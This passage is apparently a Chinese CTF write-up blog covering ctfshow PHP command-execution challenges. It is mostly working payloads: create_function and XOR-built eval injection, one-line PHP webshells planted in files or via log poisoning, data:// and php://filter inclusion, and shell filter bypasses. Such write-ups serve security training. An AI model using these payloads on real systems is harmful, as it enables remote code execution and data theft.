<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&#x27;echo $a.&quot;123&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">类似于</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>那么如果我们第二个参数传入 echo 1;}phpinfo();&#x2F;&#x2F;<br>就等价于</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="number">1</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line">从而执行<span class="title function_ invoke__">phpinfo</span>()命令</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>fuzz后发现%5c可以绕过这个正则表达式，具体原理可以看下<a href="https://paper.seebug.org/755/">这篇文章</a>这样我们就可以执行任意命令了payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get: show=<span class="keyword">echo</span> <span class="number">123</span>;&#125;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac f*&#x27;</span>);<span class="comment">//</span></span><br><span class="line">post: ctf=%<span class="number">5</span>ccreate_function</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>没有过滤^，所以直接异或构造就可以了。<br>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=(<span class="string">&quot;%08%02%08%09%05%0d&quot;</span>^<span class="string">&quot;%7b%7b%7b%7d%60%60&quot;</span>)(<span class="string">&quot;%09%01%03%01%06%02&quot;</span>^<span class="string">&quot;%7d%60%60%21%60%28&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>后来问了下出题人发现这不是预期解，预期解是利用中文变量<br>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=$哈=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f*</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>其实也是利用异或构造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>; 异或出来的结果是 _GET</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<p>非预期，直接往index.php里面写一句话<br>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctf=index.php</span><br><span class="line">show=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>预期解 条件竞争</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctf=<span class="number">1</span>.php</span><br><span class="line">show=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac /c*&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>使用bp不断访问并传参，然后开一个去不断访问 1.php</p>
<h1 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h1><p>非预期<br>日志文件包含写一句话<br>修改user_agent内容为一句话，然后包含&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log就可以使用我们写的一句话了。<br>首先访问index.php 修改<code>user_agent为&lt;?php eval($_POST[1]);?&gt;</code></p>
<p>然后包含日志文件后如下图所示</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_2.png"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>PHP特性</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow命令执行</title>
    <url>/WP/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>VIP题目，情况极多，记录！</p>
<span id="more"></span>

<h1 id="web-29"><a href="#web-29" class="headerlink" title="web 29"></a>web 29</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">通配符</span><br><span class="line">payload1:c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;nl fla?????&quot;</span>);</span><br><span class="line">payload2:c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;nl fla*&quot;</span>);</span><br><span class="line">payload3:c=<span class="keyword">echo</span> `nl fl<span class="string">&#x27;&#x27;</span>ag.php`;或者c=<span class="keyword">echo</span> `nl fl“”ag.php`;</span><br><span class="line">payload4:c=<span class="keyword">echo</span> `nl fl\ag.php`;<span class="comment">//转义字符绕过</span></span><br><span class="line">payload5:c=<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">payload6:c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);</span><br><span class="line">payload7:c=awk <span class="string">&#x27;&#123;printf $0&#125;&#x27;</span> flag.php||</span><br><span class="line">还有很多姿势，毕竟等于没过滤</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web-30"><a href="#web-30" class="headerlink" title="web 30"></a>web 30</h1><p>在上一道题的基础上多了<code>system和php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br><span class="line">反引号 同<span class="title function_ invoke__">shell_exec</span>() </span><br></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;nl fla?????&#x27;</span>);</span><br><span class="line">c=<span class="keyword">echo</span> `nl fla<span class="string">&#x27;&#x27;</span>g.p<span class="string">&#x27;&#x27;</span>hp`;</span><br><span class="line">c=<span class="keyword">echo</span> `nl fla?????`;</span><br><span class="line">还有上一道题的很多payload都可以使用</span><br></pre></td></tr></table></figure>


<h1 id="web-31"><a href="#web-31" class="headerlink" title="web 31"></a>web 31</h1><p>过滤了<code>cat\sort等</code>,空格也被过滤了尝试了一堆方法无果，尝试搞骚得</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>cat被过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似 head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是</span><br><span class="line">cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看 file -f:报错出具体内容 grep</span><br><span class="line"><span class="number">1</span>、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)))));</span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line">c=<span class="keyword">echo</span>(`nl%<span class="number">09</span>fl[abc]*`);</span><br><span class="line">c=<span class="string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="string">&quot;nl%09fl[a]*&quot;</span>);等价于<span class="title function_ invoke__">system</span>()</span><br><span class="line">c=<span class="keyword">echo</span>`strings%<span class="number">09</span>f*`;</span><br><span class="line">c=<span class="keyword">echo</span>`strings\<span class="variable">$IFS</span>\$<span class="number">9</span>f*`必须加转义字符</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>还有其他姿势：<br>首先print_r(scandir(dirname(<strong>FILE</strong>)));查看当前目录下文件<br>然后找到flag.php<br>print_r(next(array_reverse(scandir(dirname(<strong>FILE</strong>)))));<br>之后高亮显示即可<br>c&#x3D;highlight_file(next(array_reverse(scandir(dirname(<strong>FILE</strong>)))));</p>
<h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><p>小知识：include不用括号，分号可以用?&gt;代替。<br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-</span></span><br><span class="line">encode/resource=flag.php</span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web33-36"><a href="#web33-36" class="headerlink" title="web33-36"></a>web33-36</h1><p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl flag.php&quot;);?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h1><p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl fla*&quot;);?&gt;</span></span><br><span class="line">还可以配合UA头执行日志包含</span><br><span class="line">c=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><p>在上一道题的基础上过滤了php，和file<br>所以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=data:<span class="comment">//text/palin;base64,PD9waHAgc3lzdGVtKCJubCBmbGEqIik7Pz4=</span></span><br><span class="line">也可以日志包含</span><br><span class="line">c=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,&lt;?php system(“cat f*”);?&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h1><p>我字母数字RCE，我之后会另一起一篇，单独讲这个。</p>
<h1 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>，让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</span><br><span class="line">所以不能让后面执行，所以需要把后面截断ls;%<span class="number">0</span>a,后面不用多说了吧,还可以用%<span class="number">26</span>以及||</span><br></pre></td></tr></table></figure>


<h1 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h1><p>和42没多大区别。。。。，过滤了cat<code>nl%20flag.php%0a</code></p>
<h1 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h1><p>过滤了flag,没啥好说的通配符呗</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl%<span class="number">20</span>fl*%<span class="number">0</span>a</span><br></pre></td></tr></table></figure>

<h1 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h1><p>多过滤了一个空格，总所周知php环境下可以用%09代题空格<br>c&#x3D;nl%09fl*%0a<br>或者使用内联执行<br>c&#x3D;echo反引号nl$IFS*反引号%0A</p>
<h1 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h1><p>多过滤了一些数字啥的，等于没来，然后过滤了flag也可以其他姿势\ ‘’ “”等等都行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>还可以是,因为||默认是前面成功则不执行后面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl%<span class="number">09</span>fla\g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web47-48"><a href="#web47-48" class="headerlink" title="web47-48"></a>web47-48</h1><p>过滤了一点命令等于没说</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl&lt;fla<span class="string">&#x27;&#x27;</span>g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h1><p>看了一眼，也就是多过滤了几个命令而已，这里当作练习多给点payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload1:c=nl%<span class="number">09</span>fla\g.php||</span><br><span class="line">payload2:c=nl%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">payload3:c=nl%<span class="number">09</span>fla<span class="string">&#x27;&#x27;</span>g.php%<span class="number">0</span>a</span><br><span class="line">payload4:c=nl%<span class="number">09</span>fla<span class="string">&quot;&quot;</span>g.php%<span class="number">0</span>a</span><br><span class="line">payload5:c=vi%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">payload6:c=tac%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">payload7:c=uniq%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">payload8:c=nl&lt;fla<span class="string">&#x27;&#x27;</span>g.php||</span><br><span class="line">payload9:c=nl%<span class="number">09</span>fla\g.php%<span class="number">26</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h1><p>我看了一眼%09被过滤了，除此之外也没啥新的基本上，随便来个payload进入下一关吧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl&lt;fla\g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h1><p>啊这，看了一眼%也被过滤了，不过也没啥，还是上一道的payloadc：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nl&lt;fla\g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h1><p>虽然很多能当空格的都被过滤了但是，<code>$</code>却没有过滤，那么很明显了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl<span class="variable">$IFS</span>\fla\g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h1><p>感觉换了一个系列吧，这里随便来两个payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload1:c<span class="string">&#x27;&#x27;</span>at$&#123;IFS&#125;fla<span class="string">&#x27;&#x27;</span>g.p<span class="string">&#x27;&#x27;</span>hp</span><br><span class="line">payload2:c=nl<span class="variable">$IFS</span>\fla\g.php</span><br></pre></td></tr></table></figure>




<h1 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h1><p>加强了正则表达式，通配符就行了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=/bin/c??$&#123;IFS&#125;????????</span><br><span class="line">c=/bin/c??<span class="variable">$IFS</span>????????</span><br></pre></td></tr></table></figure>


<h1 id="web55-56"><a href="#web55-56" class="headerlink" title="web55-56"></a>web55-56</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    url = <span class="string">&quot;http://44875025-cec2-4154-8d87-34cbdcff5f27.chall.ctf.show/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.<span class="title function_ invoke__">post</span>(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;1.php&#x27;</span>, b<span class="string">&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.<span class="title function_ invoke__">find</span>(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://s2.loli.net/2022/03/26/ez4BhNt5li6Zy3n.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=/???/????<span class="number">64</span> ????????</span><br></pre></td></tr></table></figure>


<h1 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h1><p>这道题的目的是构造<code>36</code>这个数字,这里利用了<code>$(( ))与整数运算</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$(())------是-<span class="number">1</span></span><br><span class="line">$((~<span class="number">37</span>))------是<span class="number">36</span></span><br><span class="line">所以我们只需要保证中间是-<span class="number">37</span>即可，</span><br><span class="line">$((~$(())$(())))---是<span class="number">1</span></span><br><span class="line">所以</span><br><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))代表<span class="number">36</span>，即可获取flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h1><p>接下来的系列是绕过disable_functions系列，为了锻炼自己我决定多尝试几种姿势，都是从羽师傅那里学习到的，参考链接见下方</p>
<p>首先要获取文件路径，在这里我们可以用两种方式，我暂时想到这两种</p>
<p><code>c=print_r(scandir(dirname(&#39;``**FILE**``&#39;)));</code></p>
<p><code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</code>因为没有任何过滤我们便可以读取任意的文件</p>
<p><code>c=$a=opendir(&quot;./&quot;); while (($file = readdir($a)) !== false)&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过单一函数读取文件</span></span><br><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">readfile</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line"><span class="comment">//这里做一个解释`file — 把整个文件读入一个数组中`</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">通过fopen去读取文件内容，这里介绍下函数</span><br><span class="line"><span class="title function_ invoke__">fread</span>()</span><br><span class="line"><span class="title function_ invoke__">fgets</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetc</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetss</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetcsv</span>()</span><br><span class="line"><span class="title function_ invoke__">gpassthru</span>()</span><br><span class="line">payload:</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;<span class="comment">//一行一行读取</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;<span class="comment">//一个一个字符读取</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过高亮显示php文件</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);             </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>);             </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h1><p>首先查找flag文件的地址<code>c=print_r(scandir(&#39;./&#39;));</code>找到在当前目录下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//paylaod汇总</span></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="string">&quot;flag.php&quot;</span>)); </span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">print_r</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span 